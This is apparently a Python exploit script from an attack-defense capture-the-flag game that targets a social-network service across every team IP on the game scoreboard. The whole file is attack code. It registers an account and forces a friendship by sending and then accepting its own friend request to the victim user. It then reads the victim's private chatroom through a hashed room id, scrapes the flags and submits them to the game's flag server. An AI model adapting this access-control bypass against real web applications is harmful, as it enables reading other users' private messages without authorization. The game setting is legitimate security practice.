import json
import requests
import subprocess
from hashlib import sha256
import re
from pwn import *
import time

PORT = 3000

# Function to write the flags to a file
def write_flags_to_file(flags):
    with open("collected_flags.txt", "a") as file:
        for flag in flags:
            file.write(flag + "\n")

# Function to read previously collected flags from a file
def read_flags_from_file():
    flags = []
    try:
        with open("collected_flags.txt", "r") as file:
            for line in file:
                flags.append(line.strip())
    except FileNotFoundError:
        pass
    return flags

# Load previously collected flags from the file
sentFlags = read_flags_from_file()

teams = requests.get("https://7.enowars.com/scoreboard/attack.json").json()
service = teams["services"]["asocialnetwork"]

for ip in list(service.keys()):
    flags = []
    username = "ewrafg"

    s = requests.Session()
    try:
        r = s.post(f"http://{ip}:{str(PORT)}/register", data={"username":username, "password":"2gfd75ygf654dh&/%#", "confirmPassword":"2gfd75ygf654dh&/%#"})
        r = s.post(f"http://{ip}:{str(PORT)}/login", data={"username":username, "password":"2gfd75ygf654dh&/%#"})
    except:
        continue

    ticks = service[ip]

    for number in ticks.keys():

        for flagInfo in ticks[number].keys():
            for element in ticks[number][flagInfo]:
                test = json.loads(element)

                data1 = {"userName":username, "partner":test['username'], "status":"send"}
                r = s.post(f"http://{ip}:{str(PORT)}/friends/requests/", json=data1)

                data1["status"] = "accept"
                r = s.post(f"http://{ip}:{str(PORT)}/friends/requests/", data=data1)

                r = s.get(f"http://{ip}:{str(PORT)}/profile/{test['username']}")
                if "<h3>" in r.text:
                    roomId = r.text.split("<h3>")[1].split("<")[0]
                    print(roomId)

                    r = s.get(f"http://{ip}:{str(PORT)}/chatroom/{sha256(roomId.encode()).hexdigest()}")
                    if "ENO" in r.text:
                        flag = re.findall("ENO[A-Za-z0-9+\/=]{48}", r.text)[0]
                        if flag not in flags and flag not in sentFlags:
                            r = remote("10.0.13.37", 1337)
                            r.recvuntil(b"chronological order.\n\n")
                            r.sendline(flag)
                            sentFlags.append(flag)
                            print(r.recv())
                            r.close()

                else:
                    continue

        break

# Write the newly collected flags to the file
write_flags_to_file(sentFlags)
